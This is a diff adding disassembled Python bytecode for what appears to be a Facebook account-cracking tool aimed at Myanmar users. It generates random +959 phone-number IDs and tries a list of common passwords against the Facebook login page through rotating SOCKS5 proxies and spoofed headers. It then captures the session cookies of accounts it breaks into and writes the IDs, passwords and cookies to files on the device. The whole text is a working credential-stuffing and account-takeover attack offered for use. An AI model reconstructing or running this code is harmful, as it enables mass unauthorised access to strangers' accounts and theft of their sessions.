+            106 POP_TOP
+
+ 80         108 LOAD_GLOBAL              9 (NULL + input)
+            120 LOAD_GLOBAL              4 (white)
+            132 FORMAT_VALUE             0
+            134 LOAD_CONST               2 ('[•] Choose : ')
+            136 BUILD_STRING             2
+            138 PRECALL                  1
+            142 CALL                     1
+            152 STORE_FAST               1 (method)
+
+ 81         154 LOAD_GLOBAL              1 (NULL + banner)
+            166 PRECALL                  0
+            170 CALL                     0
+            180 POP_TOP
+
+ 82         182 LOAD_GLOBAL              3 (NULL + print)
+            194 LOAD_GLOBAL              4 (white)
+            206 FORMAT_VALUE             0
+            208 LOAD_CONST               3 ('[•] Sim Code Ep : [977,797,667,447]')
+            210 BUILD_STRING             2
+            212 PRECALL                  1
+            216 CALL                     1
+            226 POP_TOP
+
+ 83         228 LOAD_GLOBAL              7 (NULL + line)
+            240 PRECALL                  0
+            244 CALL                     0
+            254 POP_TOP
+
+ 84         256 LOAD_GLOBAL              9 (NULL + input)
+            268 LOAD_GLOBAL              4 (white)
+            280 FORMAT_VALUE             0
+            282 LOAD_CONST               4 ('[•] Input Code : ')
+            284 BUILD_STRING             2
+            286 PRECALL                  1
+            290 CALL                     1
+            300 STORE_FAST               2 (code)
+
+ 85         302 LOAD_GLOBAL              7 (NULL + line)
+            314 PRECALL                  0
+            318 CALL                     0
+            328 POP_TOP
+
+ 86         330 LOAD_GLOBAL             11 (NULL + int)
+            342 LOAD_GLOBAL              9 (NULL + input)
+            354 LOAD_GLOBAL              4 (white)
+            366 FORMAT_VALUE             0
+            368 LOAD_CONST               5 ('[?] Limit : ')
+            370 BUILD_STRING             2
+            372 PRECALL                  1
+            376 CALL                     1
+            386 PRECALL                  1
+            390 CALL                     1
+            400 STORE_FAST               3 (limit)
+
+ 87         402 LOAD_GLOBAL             13 (NULL + range)
+            414 LOAD_FAST                3 (limit)
+            416 PRECALL                  1
+            420 CALL                     1
+            430 GET_ITER
+        >>  432 FOR_ITER                67 (to 568)
+            434 STORE_FAST               4 (nmbr)
+
+ 88         436 LOAD_CONST               6 ('')
+            438 LOAD_METHOD              7 (join)
+            460 LOAD_CONST               7 (<code object <genexpr> at 0x78712d5020, file "<x>", line 88>)
+            462 MAKE_FUNCTION            0
+            464 LOAD_GLOBAL             13 (NULL + range)
+            476 LOAD_CONST               8 (6)
+            478 PRECALL                  1
+            482 CALL                     1
+            492 GET_ITER
+            494 PRECALL                  0
+            498 CALL                     0
+            508 PRECALL                  1
+            512 CALL                     1
+            522 STORE_FAST               5 (nmp)
+
+ 89         524 LOAD_FAST                0 (user)
+            526 LOAD_METHOD              8 (append)
+            548 LOAD_FAST                5 (nmp)
+            550 PRECALL                  1
+            554 CALL                     1
+            564 POP_TOP
+            566 JUMP_BACKWARD           68 (to 432)
+
+ 90     >>  568 LOAD_GLOBAL             19 (NULL + tred)
+            580 LOAD_CONST               9 (80)
+            582 KW_NAMES                10
+            584 PRECALL                  1
+            588 CALL                     1
+            598 BEFORE_WITH
+            600 STORE_FAST               6 (bmh)
+
+ 91         602 LOAD_GLOBAL              1 (NULL + banner)
+            614 PRECALL                  0
+            618 CALL                     0
+            628 POP_TOP
+
+ 92         630 LOAD_GLOBAL             21 (NULL + str)
+            642 LOAD_GLOBAL             23 (NULL + len)
+            654 LOAD_FAST                0 (user)
+            656 PRECALL                  1
+            660 CALL                     1
+            670 PRECALL                  1
+            674 CALL                     1
+            684 STORE_FAST               7 (tl)
+
+ 93         686 LOAD_GLOBAL              3 (NULL + print)
+            698 LOAD_GLOBAL              4 (white)
+            710 FORMAT_VALUE             0
+            712 LOAD_CONST              11 ('[*] Total ids   : ')
+            714 LOAD_GLOBAL             24 (green)
+            726 FORMAT_VALUE             0
+            728 BUILD_STRING             3
+            730 LOAD_FAST                7 (tl)
+            732 BINARY_OP                0 (+)
+            736 PRECALL                  1
+            740 CALL                     1
+            750 POP_TOP
+
+ 94         752 LOAD_GLOBAL              3 (NULL + print)
+            764 LOAD_GLOBAL              4 (white)
+            776 FORMAT_VALUE             0
+            778 LOAD_CONST              12 ('[*] Choice code : ')
+            780 LOAD_GLOBAL             24 (green)
+            792 FORMAT_VALUE             0
+            794 LOAD_CONST              13 ('09')
+            796 BUILD_STRING             4
+            798 LOAD_FAST                2 (code)
+            800 BINARY_OP                0 (+)
+            804 PRECALL                  1
+            808 CALL                     1
+            818 POP_TOP
+            820 LOAD_GLOBAL              7 (NULL + line)
+            832 PRECALL                  0
+            836 CALL                     0
+            846 POP_TOP
+
+ 95         848 LOAD_FAST                0 (user)
+            850 GET_ITER
+        >>  852 FOR_ITER               122 (to 1098)
+            854 STORE_FAST               8 (lee)
+
+ 96         856 LOAD_CONST              14 ('+959')
+            858 LOAD_FAST                2 (code)
+            860 BINARY_OP                0 (+)
+            864 LOAD_FAST                8 (lee)
+            866 BINARY_OP                0 (+)
+            870 STORE_FAST               9 (ids)
+
+ 97         872 LOAD_FAST                2 (code)
+            874 LOAD_FAST                8 (lee)
+            876 BINARY_OP                0 (+)
+            880 LOAD_FAST                8 (lee)
+            882 LOAD_FAST                2 (code)
+            884 LOAD_FAST                8 (lee)
+            886 LOAD_CONST               0 (None)
+            888 LOAD_CONST              15 (3)
+            890 BUILD_SLICE              2
+            892 BINARY_SUBSCR
+            902 BINARY_OP                0 (+)
+            906 LOAD_FAST                2 (code)
+            908 LOAD_FAST                8 (lee)
+            910 LOAD_CONST               0 (None)
+            912 LOAD_CONST              16 (2)
+            914 BUILD_SLICE              2
+            916 BINARY_SUBSCR
+            926 BINARY_OP                0 (+)
+            930 LOAD_FAST                2 (code)
+            932 LOAD_FAST                8 (lee)
+            934 LOAD_CONST               0 (None)
+            936 LOAD_CONST              17 (1)
+            938 BUILD_SLICE              2
+            940 BINARY_SUBSCR
+            950 BINARY_OP                0 (+)
+            954 LOAD_CONST              18 ('Myanmar')
+            956 LOAD_CONST              19 ('Myanmar123')
+            958 LOAD_CONST              20 ('myanmar123')
+            960 LOAD_CONST              21 ('myanmar')
+            962 LOAD_CONST              22 ('kyawkyaw')
+            964 LOAD_CONST              23 ('zawzaw')
+            966 LOAD_CONST              24 ('aungaung')
+            968 LOAD_CONST              25 ('chitchit')
+            970 BUILD_LIST              13
+            972 STORE_FAST              10 (passlist)
+
+ 98         974 LOAD_FAST                1 (method)
+            976 LOAD_CONST              26 ('1')
+            978 CONTAINS_OP              0
+            980 POP_JUMP_FORWARD_IF_FALSE    29 (to 1040)
+
+ 99         982 LOAD_FAST                6 (bmh)
+            984 LOAD_METHOD             13 (submit)
+           1006 LOAD_GLOBAL             28 (rndm)
+           1018 LOAD_FAST                9 (ids)
+           1020 LOAD_FAST               10 (passlist)
+           1022 PRECALL                  3
+           1026 CALL                     3
+           1036 POP_TOP
+           1038 JUMP_BACKWARD           94 (to 852)
+
+101     >> 1040 LOAD_FAST                6 (bmh)
+           1042 LOAD_METHOD             13 (submit)
+           1064 LOAD_GLOBAL             28 (rndm)
+           1076 LOAD_FAST                9 (ids)
+           1078 LOAD_FAST               10 (passlist)
+           1080 PRECALL                  3
+           1084 CALL                     3
+           1094 POP_TOP
+           1096 JUMP_BACKWARD          123 (to 852)
+
+ 95     >> 1098 NOP
+
+ 90        1100 LOAD_CONST               0 (None)
+           1102 LOAD_CONST               0 (None)
+           1104 LOAD_CONST               0 (None)
+           1106 PRECALL                  2
+           1110 CALL                     2
+           1120 POP_TOP
+           1122 JUMP_FORWARD            11 (to 1146)
+        >> 1124 PUSH_EXC_INFO
+           1126 WITH_EXCEPT_START
+           1128 POP_JUMP_FORWARD_IF_TRUE     4 (to 1138)
+           1130 RERAISE                  2
+        >> 1132 COPY                     3
+           1134 POP_EXCEPT
+           1136 RERAISE                  1
+        >> 1138 POP_TOP
+           1140 POP_EXCEPT
+           1142 POP_TOP
+           1144 POP_TOP
+
+102     >> 1146 LOAD_GLOBAL              7 (NULL + line)
+           1158 PRECALL                  0
+           1162 CALL                     0
+           1172 POP_TOP
+
+103        1174 LOAD_GLOBAL              3 (NULL + print)
+           1186 LOAD_CONST              27 ('\n[✓] Crack Successful')
+           1188 PRECALL                  1
+           1192 CALL                     1
+           1202 POP_TOP
+
+104        1204 LOAD_GLOBAL              7 (NULL + line)
+           1216 PRECALL                  0
+           1220 CALL                     0
+           1230 POP_TOP
+
+105        1232 LOAD_GLOBAL              9 (NULL + input)
+           1244 LOAD_CONST              28 ('Press Enter To Go Back Menu')
+           1246 PRECALL                  1
+           1250 CALL                     1
+           1260 POP_TOP
+           1262 LOAD_GLOBAL             31 (NULL + approveme)
+           1274 PRECALL                  0
+           1278 CALL                     0
+           1288 POP_TOP
+           1290 LOAD_CONST               0 (None)
+           1292 RETURN_VALUE
+ExceptionTable:
+  600 to 1096 -> 1124 [1] lasti
+  1124 to 1130 -> 1132 [3] lasti
+  1138 to 1138 -> 1132 [3] lasti
+
+Disassembly of <code object <genexpr> at 0x78712d5020, file "<x>", line 88>:
+ 88           0 RETURN_GENERATOR
+              2 POP_TOP
+              4 RESUME                   0
+              6 LOAD_FAST                0 (.0)
+        >>    8 FOR_ITER                34 (to 78)
+             10 STORE_FAST               1 (_)
+             12 LOAD_GLOBAL              1 (NULL + random)
+             24 LOAD_ATTR                1 (choice)
+             34 LOAD_GLOBAL              4 (string)
+             46 LOAD_ATTR                3 (digits)
+             56 PRECALL                  1
+             60 CALL                     1
+             70 YIELD_VALUE
+             72 RESUME                   1
+             74 POP_TOP
+             76 JUMP_BACKWARD           35 (to 8)
+        >>   78 LOAD_CONST               0 (None)
+             80 RETURN_VALUE
+
+Disassembly of <code object rndm at 0xb80d70, file "<x>", line 106>:
+106           0 RESUME                   0
+
+109           2 NOP
+
+110           4 LOAD_FAST                1 (passlist)
+              6 GET_ITER
+        >>    8 EXTENDED_ARG             4
+             10 FOR_ITER              1030 (to 2072)
+             12 STORE_FAST               2 (pas)
+
+111          14 LOAD_GLOBAL              0 (sys)
+             26 LOAD_ATTR                1 (stdout)
+             36 LOAD_METHOD              2 (write)
+             58 LOAD_CONST               1 ('\r\r\x1b')
+             60 LOAD_GLOBAL              6 (white)
+             72 FORMAT_VALUE             0
+             74 LOAD_CONST               2 ('[THT] %s [OK:-%s] : [CP:-%s] ')
+             76 LOAD_GLOBAL              6 (white)
+             88 FORMAT_VALUE             0
+             90 BUILD_STRING             4
+             92 LOAD_GLOBAL              8 (loop)
+            104 LOAD_GLOBAL             11 (NULL + len)
+            116 LOAD_GLOBAL             12 (oks)
+            128 PRECALL                  1
+            132 CALL                     1
+            142 LOAD_GLOBAL             11 (NULL + len)
+            154 LOAD_GLOBAL             14 (cps)
+            166 PRECALL                  1
+            170 CALL                     1
+            180 BUILD_TUPLE              3
+            182 BINARY_OP                6 (%)
+            186 PRECALL                  1
+            190 CALL                     1
+            200 POP_TOP
+            202 LOAD_GLOBAL              0 (sys)
+            214 LOAD_ATTR                1 (stdout)
+            224 LOAD_METHOD              8 (flush)
+            246 PRECALL                  0
+            250 CALL                     0
+            260 POP_TOP
+
+112         262 LOAD_GLOBAL             19 (NULL + requests)
+            274 LOAD_ATTR               10 (Session)
+            284 PRECALL                  0
+            288 CALL                     0
+            298 STORE_FAST               3 (session)
+
+113         300 LOAD_GLOBAL             23 (NULL + random)
+            312 LOAD_ATTR               12 (choice)
+            322 LOAD_GLOBAL             26 (prox)
+            334 PRECALL                  1
+            338 CALL                     1
+            348 STORE_FAST               4 (nip)
+
+114         350 LOAD_CONST               3 ('http')
+            352 LOAD_CONST               4 ('socks5://')
+            354 LOAD_FAST                4 (nip)
+            356 BINARY_OP                0 (+)
+            360 BUILD_MAP                1
+            362 STORE_FAST               5 (proxys)
+
+115         364 LOAD_GLOBAL             23 (NULL + random)
+            376 LOAD_ATTR               12 (choice)
+            386 LOAD_GLOBAL             28 (ugen)
+            398 PRECALL                  1
+            402 CALL                     1
+            412 STORE_FAST               6 (pro)
+
+116         414 LOAD_FAST                3 (session)
+            416 LOAD_METHOD             15 (get)
+            438 LOAD_CONST               5 ('https://m.facebook.com')
+            440 PRECALL                  1
+            444 CALL                     1
+            454 LOAD_ATTR               16 (text)
+            464 STORE_FAST               7 (free_fb)
+
+118         466 LOAD_GLOBAL             35 (NULL + re)
+            478 LOAD_ATTR               18 (search)
+            488 LOAD_CONST               6 ('name="lsd" value="(.*?)"')
+            490 LOAD_GLOBAL             39 (NULL + str)
+            502 LOAD_FAST                7 (free_fb)
+            504 PRECALL                  1
+            508 CALL                     1
+            518 PRECALL                  2
+            522 CALL                     2
+            532 LOAD_METHOD             20 (group)
+            554 LOAD_CONST               7 (1)
+            556 PRECALL                  1
+            560 CALL                     1
+
+119         570 LOAD_GLOBAL             35 (NULL + re)
+            582 LOAD_ATTR               18 (search)
+            592 LOAD_CONST               8 ('name="jazoest" value="(.*?)"')
+            594 LOAD_GLOBAL             39 (NULL + str)
+            606 LOAD_FAST                7 (free_fb)
+            608 PRECALL                  1
+            612 CALL                     1
+            622 PRECALL                  2
+            626 CALL                     2
+            636 LOAD_METHOD             20 (group)
+            658 LOAD_CONST               7 (1)
+            660 PRECALL                  1
+            664 CALL                     1
+
+120         674 LOAD_GLOBAL             35 (NULL + re)
+            686 LOAD_ATTR               18 (search)
+            696 LOAD_CONST               9 ('name="m_ts" value="(.*?)"')
+            698 LOAD_GLOBAL             39 (NULL + str)
+            710 LOAD_FAST                7 (free_fb)
+            712 PRECALL                  1
+            716 CALL                     1
+            726 PRECALL                  2
+            730 CALL                     2
+            740 LOAD_METHOD             20 (group)
+            762 LOAD_CONST               7 (1)
+            764 PRECALL                  1
+            768 CALL                     1
+
+121         778 LOAD_GLOBAL             35 (NULL + re)
+            790 LOAD_ATTR               18 (search)
+            800 LOAD_CONST              10 ('name="li" value="(.*?)"')
+            802 LOAD_GLOBAL             39 (NULL + str)
+            814 LOAD_FAST                7 (free_fb)
+            816 PRECALL                  1
+            820 CALL                     1
+            830 PRECALL                  2
+            834 CALL                     2
+            844 LOAD_METHOD             20 (group)
+            866 LOAD_CONST               7 (1)
+            868 PRECALL                  1
+            872 CALL                     1
+
+122         882 LOAD_CONST              11 ('0')
+
+123         884 LOAD_CONST              11 ('0')
+
+124         886 LOAD_FAST                0 (ids)
+
+125         888 LOAD_FAST                2 (pas)
+
+126         890 LOAD_CONST              12 ('Log In')
+
+117         892 LOAD_CONST              13 (('lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'email', 'pass', 'login'))
+            894 BUILD_CONST_KEY_MAP      9
+            896 STORE_FAST               8 (login_data)
+
+127         898 BUILD_MAP                0
+            900 LOAD_CONST              14 ('authority')
+            902 LOAD_CONST              15 ('www.facebook.com')
+            904 MAP_ADD                  1
+
+128         906 LOAD_CONST              16 ('method')
+            908 LOAD_CONST              17 ('GET')
+
+127         910 MAP_ADD                  1
+
+129         912 LOAD_CONST              18 ('scheme')
+            914 LOAD_CONST              19 ('https')
+
+127         916 MAP_ADD                  1
+
+130         918 LOAD_CONST              20 ('accept')
+            920 LOAD_CONST              21 ('*/*')
+
+127         922 MAP_ADD                  1
+
+131         924 LOAD_CONST              20 ('accept')
+            926 LOAD_CONST              22 ('text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7')
+
+127         928 MAP_ADD                  1
+
+132         930 LOAD_CONST              23 ('accept-language')
+            932 LOAD_CONST              24 ('en-US,en;q=0.9')
+
+127         934 MAP_ADD                  1
+
+133         936 LOAD_CONST              25 ('cache-control')
+            938 LOAD_CONST              26 ('max-age=0')
+
+127         940 MAP_ADD                  1
+
+134         942 LOAD_CONST              27 ('content-type')
+            944 LOAD_CONST              28 ('application/x-www-form-urlencoded')
+
+127         946 MAP_ADD                  1
+
+135         948 LOAD_CONST              29 ('origin')
+            950 LOAD_CONST              30 ('https://www.facebook.com')
+
+127         952 MAP_ADD                  1
+
+136         954 LOAD_CONST              31 ('referer')
+            956 LOAD_CONST              32 ('https://www.facebook.com/')
+
+127         958 MAP_ADD                  1
+
+137         960 LOAD_CONST              33 ('sec-ch-ua')
+            962 LOAD_CONST              34 ('"Not-A.Brand";v="99", "Chromium";v="124"')
+
+127         964 MAP_ADD                  1
+
+138         966 LOAD_CONST              35 ('sec-ch-ua-full-version-list')
+            968 LOAD_CONST              36 ('"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"')
+
+127         970 MAP_ADD                  1
+
+139         972 LOAD_CONST              37 ('sec-ch-ua-mobile')
+            974 LOAD_CONST              38 ('?0')
+
+127         976 MAP_ADD                  1
+
+140         978 LOAD_CONST              39 ('sec-ch-ua-platform')
+            980 LOAD_CONST              40 ('"Linux"')
+
+127         982 MAP_ADD                  1
+
+141         984 LOAD_CONST              41 ('sec-fetch-dest')
+            986 LOAD_CONST              42 ('document')
+
+127         988 MAP_ADD                  1
+
+142         990 LOAD_CONST              43 ('sec-fetch-mode')
+            992 LOAD_CONST              44 ('navigate')
+
+127         994 MAP_ADD                  1
+
+143         996 LOAD_CONST              45 ('sec-fetch-site')
+            998 LOAD_CONST              46 ('same-origin')
+
+127        1000 MAP_ADD                  1
+
+144        1002 LOAD_CONST              47 ('gzip, deflate, br')
+
+145        1004 LOAD_CONST              48 ('?1')
+
+146        1006 LOAD_FAST                6 (pro)
+
+147        1008 LOAD_CONST              49 ('980')
+
+127        1010 LOAD_CONST              50 (('accept-encoding', 'sec-fetch-user', 'user-agent', 'viewport-width'))
+           1012 BUILD_CONST_KEY_MAP      4
+           1014 DICT_UPDATE              1
+           1016 STORE_FAST               9 (header)
+
+148        1018 LOAD_FAST                3 (session)
+           1020 LOAD_METHOD             21 (post)
+           1042 LOAD_CONST              51 ('https://www.facebook.com/login/')
+           1044 LOAD_FAST                8 (login_data)
+           1046 LOAD_FAST                9 (header)
+           1048 LOAD_FAST                5 (proxys)
+           1050 KW_NAMES                52
+           1052 PRECALL                  4
+           1056 CALL                     4
+           1066 LOAD_ATTR               16 (text)
+           1076 STORE_FAST              10 (sex)
+
+149        1078 LOAD_FAST                3 (session)
+           1080 LOAD_ATTR               22 (cookies)
+           1090 LOAD_METHOD             23 (get_dict)
+           1112 PRECALL                  0
+           1116 CALL                     0
+           1126 LOAD_METHOD             24 (keys)
+           1148 PRECALL                  0
+           1152 CALL                     0
+           1162 STORE_FAST              11 (login_webs)
+
+150        1164 LOAD_CONST              53 ('c_user')
+           1166 LOAD_FAST               11 (login_webs)
+           1168 CONTAINS_OP              0
+           1170 EXTENDED_ARG             1
+           1172 POP_JUMP_FORWARD_IF_FALSE   257 (to 1688)
+
+151        1174 LOAD_CONST              54 (';')
+           1176 LOAD_METHOD             25 (join)
+           1198 LOAD_CONST              55 (<code object <listcomp> at 0x7871298730, file "<x>", line 151>)
+           1200 MAKE_FUNCTION            0
+           1202 LOAD_FAST                3 (session)
+           1204 LOAD_ATTR               22 (cookies)
+           1214 LOAD_METHOD             23 (get_dict)
+           1236 PRECALL                  0
+           1240 CALL                     0
+           1250 LOAD_METHOD             26 (items)
+           1272 PRECALL                  0
+           1276 CALL                     0
+           1286 GET_ITER
+           1288 PRECALL                  0
+           1292 CALL                     0
+           1302 PRECALL                  1
+           1306 CALL                     1
+           1316 STORE_FAST              12 (coki)
+
+152        1318 LOAD_GLOBAL             35 (NULL + re)
+           1330 LOAD_ATTR               27 (findall)
+           1340 LOAD_CONST              56 ('c_user=(.*);xs')
+           1342 LOAD_FAST               12 (coki)
+           1344 PRECALL                  2
+           1348 CALL                     2
+           1358 LOAD_CONST              57 (0)
+           1360 BINARY_SUBSCR
+           1370 STORE_FAST               0 (ids)
+
+153        1372 LOAD_FAST                0 (ids)
+           1374 STORE_FAST              13 (uid)
+
+154        1376 LOAD_GLOBAL             57 (NULL + print)
+           1388 LOAD_CONST               1 ('\r\r\x1b')
+           1390 LOAD_GLOBAL             58 (green)
+           1402 FORMAT_VALUE             0
+           1404 LOAD_CONST              58 ('[THT-OK] ')
+           1406 LOAD_FAST               13 (uid)
+           1408 FORMAT_VALUE             0
+           1410 LOAD_CONST              59 (' | ')
+           1412 LOAD_FAST                2 (pas)
+           1414 FORMAT_VALUE             0
+           1416 BUILD_STRING             6
+           1418 PRECALL                  1
+           1422 CALL                     1
+           1432 POP_TOP
+
+155        1434 LOAD_GLOBAL             57 (NULL + print)
+           1446 LOAD_GLOBAL              6 (white)
+           1458 FORMAT_VALUE             0
+           1460 LOAD_CONST              60 ('[Cookie] : ')
+           1462 LOAD_GLOBAL             60 (green_low)
+           1474 FORMAT_VALUE             0
+           1476 LOAD_FAST               12 (coki)
+           1478 FORMAT_VALUE             0
+           1480 BUILD_STRING             4
+           1482 PRECALL                  1
+           1486 CALL                     1
+           1496 POP_TOP
+           1498 LOAD_GLOBAL             63 (NULL + line)
+           1510 PRECALL                  0
+           1514 CALL                     0
+           1524 POP_TOP
+
+156        1526 LOAD_GLOBAL             65 (NULL + open)
+           1538 LOAD_CONST              61 ('/sdcard/THT-OK.txt')
+           1540 LOAD_CONST              62 ('a')
+           1542 PRECALL                  2
+           1546 CALL                     2
+           1556 LOAD_METHOD              2 (write)
+           1578 LOAD_FAST               13 (uid)
+           1580 LOAD_CONST              63 ('|')
+           1582 BINARY_OP                0 (+)
+           1586 LOAD_FAST                2 (pas)
+           1588 BINARY_OP                0 (+)
+           1592 LOAD_CONST              64 ('\n')
+           1594 BINARY_OP                0 (+)
+           1598 LOAD_CONST              65 ('Cookie = ')
+           1600 BINARY_OP                0 (+)
+           1604 LOAD_FAST               12 (coki)
+           1606 BINARY_OP                0 (+)
+           1610 LOAD_CONST              64 ('\n')
+           1612 BINARY_OP                0 (+)
+           1616 PRECALL                  1
+           1620 CALL                     1
+           1630 POP_TOP
+
+157        1632 LOAD_GLOBAL             12 (oks)
+           1644 LOAD_METHOD             33 (append)
+           1666 LOAD_FAST               13 (uid)
+           1668 PRECALL                  1
+           1672 CALL                     1
+           1682 POP_TOP
+
+158        1684 POP_TOP
+           1686 JUMP_FORWARD           192 (to 2072)
+
+159     >> 1688 LOAD_CONST              66 ('checkpoint')
+           1690 LOAD_FAST               11 (login_webs)
+           1692 CONTAINS_OP              0
+           1694 POP_JUMP_FORWARD_IF_FALSE   186 (to 2068)
+
+160        1696 LOAD_CONST              54 (';')
+           1698 LOAD_METHOD             25 (join)
+           1720 LOAD_CONST              67 (<code object <listcomp> at 0x787129b3d0, file "<x>", line 160>)
+           1722 MAKE_FUNCTION            0
+           1724 LOAD_FAST                3 (session)
+           1726 LOAD_ATTR               22 (cookies)
+           1736 LOAD_METHOD             23 (get_dict)
+           1758 PRECALL                  0
+           1762 CALL                     0
+           1772 LOAD_METHOD             26 (items)
+           1794 PRECALL                  0
+           1798 CALL                     0
+           1808 GET_ITER
+           1810 PRECALL                  0
+           1814 CALL                     0
+           1824 PRECALL                  1
+           1828 CALL                     1
+           1838 STORE_FAST              12 (coki)
+
+161        1840 LOAD_FAST               12 (coki)
+           1842 LOAD_METHOD             34 (split)
+           1864 LOAD_CONST              68 ('1000')
+           1866 PRECALL                  1
+           1870 CALL                     1
+           1880 LOAD_CONST               7 (1)
+           1882 BINARY_SUBSCR
+           1892 STORE_FAST              14 (coki1)
+
+162        1894 LOAD_CONST              68 ('1000')
+           1896 LOAD_FAST               14 (coki1)
+           1898 LOAD_CONST              57 (0)
+           1900 LOAD_CONST              69 (11)
+           1902 BUILD_SLICE              2
+           1904 BINARY_SUBSCR
+           1914 BINARY_OP                0 (+)
+           1918 STORE_FAST               0 (ids)
+
+163        1920 LOAD_FAST                0 (ids)
+           1922 STORE_FAST              13 (uid)
+
+165        1924 LOAD_GLOBAL             65 (NULL + open)
+           1936 LOAD_CONST              70 ('/sdcard/THT-CP.txt')
+           1938 LOAD_CONST              62 ('a')
+           1940 PRECALL                  2
+           1944 CALL                     2
+           1954 LOAD_METHOD              2 (write)
+           1976 LOAD_FAST               13 (uid)
+           1978 LOAD_CONST              63 ('|')
+           1980 BINARY_OP                0 (+)
+           1984 LOAD_FAST                2 (pas)
+           1986 BINARY_OP                0 (+)
+           1990 LOAD_CONST              64 ('\n')
+           1992 BINARY_OP                0 (+)
+           1996 PRECALL                  1
+           2000 CALL                     1
+           2010 POP_TOP
+
+166        2012 LOAD_GLOBAL             14 (cps)
+           2024 LOAD_METHOD             33 (append)
+           2046 LOAD_FAST               13 (uid)
+           2048 PRECALL                  1
+           2052 CALL                     1
+           2062 POP_TOP
+
+167        2064 POP_TOP
+           2066 JUMP_FORWARD             2 (to 2072)
+
+169     >> 2068 EXTENDED_ARG             4
+           2070 JUMP_BACKWARD         1032 (to 8)
+
+170     >> 2072 LOAD_GLOBAL              8 (loop)
+           2084 LOAD_CONST               7 (1)
+           2086 BINARY_OP               13 (+=)
+           2090 STORE_GLOBAL             4 (loop)
+           2092 LOAD_CONST               0 (None)
+           2094 RETURN_VALUE
+        >> 2096 PUSH_EXC_INFO
+
+171        2098 POP_TOP
+
+172        2100 POP_EXCEPT
+           2102 LOAD_CONST               0 (None)
+           2104 RETURN_VALUE
+        >> 2106 COPY                     3
+           2108 POP_EXCEPT
+           2110 RERAISE                  1
+ExceptionTable:
+  4 to 2090 -> 2096 [0]
+  2096 to 2098 -> 2106 [1] lasti
+
+Disassembly of <code object <listcomp> at 0x7871298730, file "<x>", line 151>:
+151           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                13 (to 34)
+              8 UNPACK_SEQUENCE          2
+             12 STORE_FAST               1 (key)
+             14 STORE_FAST               2 (value)
+             16 LOAD_FAST                1 (key)
+             18 LOAD_CONST               0 ('=')
+             20 BINARY_OP                0 (+)
+             24 LOAD_FAST                2 (value)
+             26 BINARY_OP                0 (+)
+             30 LIST_APPEND              2
+             32 JUMP_BACKWARD           14 (to 6)
+        >>   34 RETURN_VALUE
+
+Disassembly of <code object <listcomp> at 0x787129b3d0, file "<x>", line 160>:
+160           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                13 (to 34)
+              8 UNPACK_SEQUENCE          2
+             12 STORE_FAST               1 (key)
+             14 STORE_FAST               2 (value)
+             16 LOAD_FAST                1 (key)
+             18 LOAD_CONST               0 ('=')
+             20 BINARY_OP                0 (+)
+             24 LOAD_FAST                2 (value)
+             26 BINARY_OP                0 (+)
+             30 LIST_APPEND              2
+             32 JUMP_BACKWARD           14 (to 6)
+        >>   34 RETURN_VALUE
+
+Disassembly of <code object menu_apikey at 0xb64630, file "<x>", line 208>:
+208           0 RESUME                   0
+
+209           2 LOAD_GLOBAL              1 (NULL + banner)
+             14 PRECALL                  0
+             18 CALL                     0
+             28 POP_TOP
+             30 LOAD_GLOBAL              3 (NULL + print)
+             42 LOAD_CONST               1 ('Checking Update....')
+             44 PRECALL                  1
+             48 CALL                     1
+             58 POP_TOP
+             60 LOAD_GLOBAL              5 (NULL + time)
+             72 LOAD_ATTR                3 (sleep)
+             82 LOAD_CONST               2 (2)
+             84 PRECALL                  1
+             88 CALL                     1
+             98 POP_TOP
+            100 LOAD_GLOBAL              9 (NULL + os)
+            112 LOAD_ATTR                5 (system)
+            122 LOAD_CONST               3 ('clear')
+            124 PRECALL                  1
+            128 CALL                     1
+            138 POP_TOP
+
+210         140 NOP
+
+211         142 LOAD_GLOBAL             13 (NULL + requests)
+            154 LOAD_ATTR                7 (get)
+            164 LOAD_GLOBAL             16 (approve)
+            176 FORMAT_VALUE             0
+            178 PRECALL                  1
+            182 CALL                     1
+            192 LOAD_ATTR                9 (text)
+            202 STORE_FAST               0 (httpCaht)
+
+212         204 LOAD_CONST               4 ('server-on')
+            206 LOAD_FAST                0 (httpCaht)
+            208 CONTAINS_OP              0
+            210 POP_JUMP_FORWARD_IF_FALSE    85 (to 382)
+
+213         212 LOAD_GLOBAL              3 (NULL + print)
+            224 LOAD_CONST               5 ('\x1b[1;32mSERVER IF ON ')
+            226 PRECALL                  1
+            230 CALL                     1
+            240 POP_TOP
+            242 LOAD_GLOBAL              5 (NULL + time)
+            254 LOAD_ATTR                3 (sleep)
+            264 LOAD_CONST               2 (2)
+            266 PRECALL                  1
+            270 CALL                     1
+            280 POP_TOP
+
+214         282 LOAD_GLOBAL             21 (NULL + line)
+            294 PRECALL                  0
+            298 CALL                     0
+            308 POP_TOP
+
+215         310 LOAD_GLOBAL             23 (NULL + main)
+            322 PRECALL                  0
+            326 CALL                     0
+            336 POP_TOP
+
+216         338 LOAD_GLOBAL              5 (NULL + time)
+            350 LOAD_ATTR                3 (sleep)
+            360 LOAD_CONST               6 (0.5)
+            362 PRECALL                  1
+            366 CALL                     1
+            376 POP_TOP
+
+217         378 LOAD_CONST               0 (None)
+            380 RETURN_VALUE
+
+218     >>  382 LOAD_CONST               7 ('server-off')
+            384 LOAD_FAST                0 (httpCaht)
+            386 CONTAINS_OP              0
+            388 POP_JUMP_FORWARD_IF_FALSE    65 (to 520)
+
+219         390 LOAD_GLOBAL              3 (NULL + print)
+            402 LOAD_CONST               8 ('\x1b[1;91mSERVER IF OFF')
+            404 PRECALL                  1
+            408 CALL                     1
+            418 POP_TOP
+            420 LOAD_GLOBAL              5 (NULL + time)
+            432 LOAD_ATTR                3 (sleep)
+            442 LOAD_CONST               2 (2)
+            444 PRECALL                  1
+            448 CALL                     1
+            458 POP_TOP
+
+220         460 LOAD_GLOBAL             21 (NULL + line)
+            472 PRECALL                  0
+            476 CALL                     0
+            486 POP_TOP
+
+221         488 LOAD_GLOBAL             25 (NULL + exit)
+            500 PRECALL                  0
+            504 CALL                     0
+            514 POP_TOP
+            516 LOAD_CONST               0 (None)
+            518 RETURN_VALUE
+
+223     >>  520 LOAD_GLOBAL              3 (NULL + print)
